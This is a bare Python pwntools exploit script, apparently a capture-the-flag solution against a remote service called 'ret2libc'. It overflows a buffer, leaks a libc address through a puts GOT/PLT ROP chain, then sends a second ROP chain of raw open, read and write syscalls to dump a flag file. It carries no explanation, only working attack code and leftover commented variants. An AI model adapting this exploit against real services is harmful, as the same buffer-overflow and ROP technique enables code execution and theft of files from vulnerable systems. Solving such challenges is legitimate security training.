from pwn import *

elf = context.binary = ELF("ret2libc")

libc = ELF("libc.so.6")

#p = process("./ret2libc")
p = remote("34.213.62.140",6504)

pop_rdi_ret = 0x0000000000401373
payload1 = b'a'*56 + p64(pop_rdi_ret) + p64(elf.got.puts) + \
    p64(elf.plt.puts) + p64(elf.sym.waifusSecret)

for i in range(5):
    p.recvline()

p.sendline(payload1)
leak = p.recvline()[:-1]
leak=leak.ljust(8,b'\x00')
leak = u64(leak)

libc.address = leak - libc.sym.puts
print(hex(libc.address))
libc_pop_rdi_ret = libc.address + 0x0000000000023b6a
libc_pop_rax_ret = libc.address + 0x0000000000036174
libc_pop_rsi_ret = libc.address + 0x000000000002601f
libc_pop_rdx_ret = libc.address + 0x0000000000142c92
syscall_ret = libc.address + 0x00000000000630a9
ret = libc.address + 0x00000000000c1801  # offset found using ropper
#print(libc.address)
#print(libc_pop_rdi_ret)
#print(libc_pop_rax_ret)
#print(libc_pop_rsi_ret)
#print(libc_pop_rdx_ret)
#print(syscall_ret)
#print(ret)
rop=ROP(libc)
#print(rop.find_gadget(["pop rdi","ret"])[0])
#print(rop.find_gadget(["pop rax","ret"])[0])
#print(rop.find_gadget(["pop rsi","ret"])[0])
#print(rop.find_gadget(["pop rdx","ret"])[0])
#print(rop.find_gadget(["syscall","ret"])[0])
#print(rop.find_gadget(["ret"])[0])                # different than the above ret
flag_file = 0x402020
read_write_area = 0x404100

payload2 = flat('a'*56, libc_pop_rax_ret, 2, libc_pop_rdi_ret, flag_file, libc_pop_rsi_ret, 0, 
                libc_pop_rdx_ret, 0, syscall_ret,
                libc_pop_rax_ret, 0, libc_pop_rdi_ret, 3, libc_pop_rsi_ret, read_write_area,
                libc_pop_rdx_ret, 0x50, syscall_ret, 
                libc_pop_rax_ret, 1, libc_pop_rdi_ret, 1, 
                libc_pop_rsi_ret, read_write_area, libc_pop_rdx_ret, 0x50, syscall_ret)

#payload2 = flat('a'*56, rop.find_gadget(["ret"])[0], libc_pop_rax_ret, constants.SYS_open, libc_pop_rdi_ret, flag_file, libc_pop_rsi_ret, 0, syscall_ret,
#                libc_pop_rax_ret, constants.SYS_read, libc_pop_rdi_ret, 3, libc_pop_rsi_ret, read_write_area,
#                libc_pop_rdx_ret, 0x40, syscall_ret, 
#                libc_pop_rax_ret, constants.SYS_write, libc_pop_rdi_ret, constants.STDOUT_FILENO, 
#                libc_pop_rsi_ret, read_write_area, libc_pop_rdx_ret, 0x40, syscall_ret)

for i in range(5):
    p.recvline()


p.sendline(payload2)
p.interactive()
